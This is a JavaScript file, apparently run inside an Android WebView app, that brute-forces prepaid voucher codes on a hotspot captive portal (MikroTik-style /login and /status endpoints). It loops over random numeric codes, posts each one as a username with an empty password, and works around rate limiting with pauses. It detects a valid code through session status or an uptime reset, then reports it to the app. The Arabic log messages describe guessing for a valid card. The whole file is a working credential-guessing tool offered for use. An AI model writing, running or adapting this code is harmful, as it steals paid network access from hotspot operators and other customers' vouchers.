(function() {
    const CFG = window.FINDER_CONFIG;
    let stopped = false;

    function log(msg) {
        if (window.AndroidBridge) window.AndroidBridge.log(msg);
    }
    function progress(cur, total, voucher) {
        if (window.AndroidBridge) window.AndroidBridge.progress(cur, total, voucher);
    }
    function reportFound(voucher, status) {
        if (window.AndroidBridge) window.AndroidBridge.found(voucher, JSON.stringify(status));
    }

    window.stopFinder = function() { stopped = true; };

    async function safeJson(url) {
        try {
            const r = await fetch(url, { credentials: 'include', cache: 'no-cache' });
            const t = await r.text();
            try { return JSON.parse(t); } catch(e) {
                const s = t.indexOf('{'), e2 = t.lastIndexOf('}');
                if (s !== -1 && e2 > s) { try { return JSON.parse(t.substring(s, e2+1)); } catch(_) {} }
                return null;
            }
        } catch(e) { return null; }
    }

    function isActive(st) {
        if (!st || typeof st !== 'object') return false;
        const li = String(st.logged_in || '').toLowerCase();
        if (!['yes','true','1','on'].includes(li)) return false;
        const u = String(st.username || '').trim();
        const ip = String(st.ip || '').trim();
        const up = String(st.uptime || '').trim();
        if (u && u !== '-' && u !== 'N/A') return true;
        if (ip && ip !== '-' && up && up !== '-') return true;
        return false;
    }

    function statusUser(st) {
        if (!st) return null;
        const u = String(st.username || '').trim();
        if (u && u !== '-' && u !== 'N/A' && u !== '---') return u;
        return null;
    }

    function uptimeSec(s) {
        if (!s) return -1;
        const m = String(s).trim().match(/^(?:(\d+)d)?(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?$/);
        if (!m) return -1;
        return (parseInt(m[1]||0)*86400) + (parseInt(m[2]||0)*3600) + (parseInt(m[3]||0)*60) + parseInt(m[4]||0);
    }

    async function run() {
        const base = new URL(CFG.url).origin;
        const statusUrl = base + '/status?var=callBack';
        const loginUrl = base + '/login';

        log('▶ بدء: ' + base);

        // 1. فحص الكرت المسجل مسبقاً (كما في V30)
        log('فحص الحالة الحالية...');
        const init = await safeJson(statusUrl);
        if (init && isActive(init)) {
            const u = statusUser(init);
            if (u) {
                log('✓ كرت مسجل: ' + u);
                reportFound(u, init);
                return;
            } else {
                log('⚠ جلسة نشطة لكن username مخفي');
                log('  اخرج من الجلسة أولاً من المتصفح');
                return;
            }
        }
        log('لا كرت مسجل — بدء التخمين');

        // 2. استخراج الحقول من صفحة الدخول
        let template = { username: '', password: '', dst: base + '/', popup: 'true' };
        try {
            const html = await fetch(CFG.url, { credentials: 'include' }).then(r => r.text());
            const doc = new DOMParser().parseFromString(html, 'text/html');
            const form = doc.querySelector('form');
            if (form) {
                form.querySelectorAll('input').forEach(inp => {
                    const n = inp.getAttribute('name');
                    if (n) template[n] = inp.getAttribute('value') || '';
                });
                log('✓ الحقول: ' + Object.keys(template).join(', '));
            }
        } catch(e) { log('⚠ لا form: ' + e.message); }

        // 3. حلقة التخمين
        const maxVal = Math.pow(10, CFG.digits) - 1;
        const tried = new Set();
        let beforeUp = -1;
        const preSt = await safeJson(statusUrl);
        if (preSt) beforeUp = uptimeSec(preSt.uptime);
        const beforeActive = isActive(preSt);

        for (let i = 0; i < CFG.attempts; i++) {
            if (stopped) { log('⏹ إيقاف يدوي'); return; }

            let num = Math.floor(Math.random() * (maxVal + 1));
            let v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
            let retry = 0;
            while (tried.has(v) && retry < 100) {
                num = Math.floor(Math.random() * (maxVal + 1));
                v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
                retry++;
            }
            if (tried.has(v)) { log('⚠ نفدت الأرقام'); break; }
            tried.add(v);

            progress(i + 1, CFG.attempts, v);

            try {
                const body = new URLSearchParams();
                for (const k in template) body.set(k, template[k]);
                body.set('username', v);
                body.set('password', '');

                const r = await fetch(loginUrl, {
                    method: 'POST',
                    body: body.toString(),
                    credentials: 'include',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    redirect: 'manual'
                });

                if (r.status === 429 || r.status === 503) {
                    log('🛑 حظر مؤقت (' + r.status + ') — انتظار 3s');
                    await new Promise(res => setTimeout(res, 3000));
                }

                await new Promise(res => setTimeout(res, 200));

                const st = await safeJson(statusUrl);
                if (st) {
                    const u = statusUser(st);
                    if (u === v) {
                        log('✅ كرت صحيح: ' + v);
                        reportFound(v, st);
                        return;
                    }
                    const nowUp = uptimeSec(st.uptime);
                    if (isActive(st) && beforeUp > 30 && nowUp >= 0 && nowUp <= 15) {
                        log('✅ كشف uptime reset: ' + v);
                        reportFound(v, st);
                        return;
                    }
                    if (isActive(st) && !beforeActive && nowUp >= 0 && nowUp <= 15) {
                        log('✅ جلسة جديدة: ' + v);
                        reportFound(v, st);
                        return;
                    }
                }
            } catch(e) {
                log('⚠ ' + v + ': ' + e.message.substring(0, 40));
            }

            if (i % 10 === 9) {
                await new Promise(res => setTimeout(res, 400));
            }
        }

        log('❌ لم يُعثر على كرت في ' + tried.size + ' محاولة');
    }

    if (document.readyState === 'complete') setTimeout(run, 500);
    else window.addEventListener('load', () => setTimeout(run, 500));
})();
